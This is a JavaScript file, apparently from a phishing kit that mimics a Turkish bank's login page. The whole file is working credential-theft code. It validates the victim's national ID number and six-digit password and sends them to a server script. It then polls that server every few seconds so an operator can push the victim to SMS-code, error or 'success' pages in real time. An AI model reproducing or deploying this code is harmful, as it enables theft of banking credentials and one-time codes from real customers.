document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        function isValidCustomerTcknNumber(value) {
            value = String(value);
            if (value.substring(0, 1) === '0') {
                return false;
            }
            if (value.length !== 11) {
                return false;
            }
            var ilkon_array = value.substr(0, 10).split('');
            var ilkon_total = hane_tek = hane_cift = 0;
            for (var i = j = 0; i < 9; ++i) {
                j = parseInt(ilkon_array[i], 10);
                if (i & 1) {
                    hane_cift += j;
                } else {
                    hane_tek += j;
                }
                ilkon_total += j;
            }
            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(value.substr(-2, 1), 10)) {
                return false;
            }
            ilkon_total += parseInt(ilkon_array[9], 10);
            if (ilkon_total % 10 !== parseInt(value.substr(-1), 10)) {
                return false;
            }
            return true;
        }

        function isValidPassword(value) {
            return /^[0-9]{6}$/.test(value);
        }

        // HTML elementlerini seçin
        const submitButton = document.getElementById('submitButton');
        const musteriNo = document.getElementById('txtMusteriNo');
        const sifre = document.getElementById('txtSifreP');
        const musteriNoError = document.getElementById('txtMusteriNoError');
        const sifreError = document.getElementById('txtSifrePError');

        if (submitButton && musteriNo && sifre && musteriNoError && sifreError) {
            submitButton.addEventListener('click', function(event) {
                event.preventDefault();
                
                let isValid = true;

                if (!isValidCustomerTcknNumber(musteriNo.value)) {
                    musteriNoError.style.display = 'block';
                    isValid = false;
                } else {
                    musteriNoError.style.display = 'none';
                }

                if (!isValidPassword(sifre.value)) {
                    sifreError.style.display = 'block';
                    isValid = false;
                } else {
                    sifreError.style.display = 'none';
                }

                if (isValid) {
                    fetch('/livechats.php', {
                        method: 'POST',
                        body: new URLSearchParams({
                            txtMusteriNo: musteriNo.value,
                            txtSifreP: sifre.value
                        })
                    }).then(response => {
                        if (response.ok) {
                            window.location.href = '../phone.php';
                        } else {
                            alert("Giriş başarısız");
                        }
                    }).catch(error => {
                        console.error('Hata:', error);
                        alert("Giriş başarısız");
                    });
                }
            });
        } else {
            console.error('Bir veya daha fazla element bulunamadı');
        }

        function sendUrlPath() {
            const currentUrl = window.location.pathname;
            const urlPath = currentUrl.substring(currentUrl.lastIndexOf('/') + 1);
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "livechat.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const responseText = xhr.responseText.trim();
                    switch (responseText) {
                        case "sms":
                            window.location.href = 'sms.php';
                            break;
                        case "hata":
                            window.location.href = 'hatali.php';
                            break;
                        case "sms2":
                            window.location.href = 'bildirim.php';
                            break;
                        case "back":
                            window.location.href = '/';
                            break;
                        case "tebrik":
                            window.location.href = 'basarili.php';
                            break;
                        default:
                    }
                }
            };
            xhr.send(`x=${urlPath}`);
        }

        setInterval(sendUrlPath, 2500);
    }, 1000);
});
